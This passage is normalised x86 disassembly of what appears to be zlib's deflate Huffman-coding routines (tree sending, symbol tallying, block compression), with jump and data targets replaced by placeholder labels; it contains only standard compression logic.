mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_40a57c
push ebp
mov ebp esp
sub esp 0x5c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x6 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x10 ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
mov [ ebp - 0x20 ] edx
mov eax 0x10
sub eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa74 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x24 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xabe ]
mov [ ebp - 0x50 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x50 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xaba ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab6 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0xa76 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xabc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x50 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xabc ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x54 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x54 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x50 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xab8 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xab4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x34 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x34 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x2c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0xb
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0xb
mov [ ebp - 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x5c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x5c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x58 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x58 ] 0x7
mov edx 0x10
sub edx [ ebp - 0x58 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x4c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x4c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x48 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x48 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x38 ] 0x2
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_40b054
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov dx [ ebp + 0xc ]
mov [ eax + ecx * 2 ] dx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1690 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1698 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a8 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
cmp [ ebp + 0xc ] 0x100
jae r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x8c ]
add dx 0x1
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x8c ] dx
jmp r-xdata
mov ecx [ ebp + 0xc ]
shr ecx 0x7
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1694 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x1698 ] eax
sete dl
mov eax edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x980 ]
add dx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x980 ] dx
sub_40b182
push ebp
mov ebp esp
sub esp 0x48
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1698 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ eax + ecx ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + 0x400 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x400 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
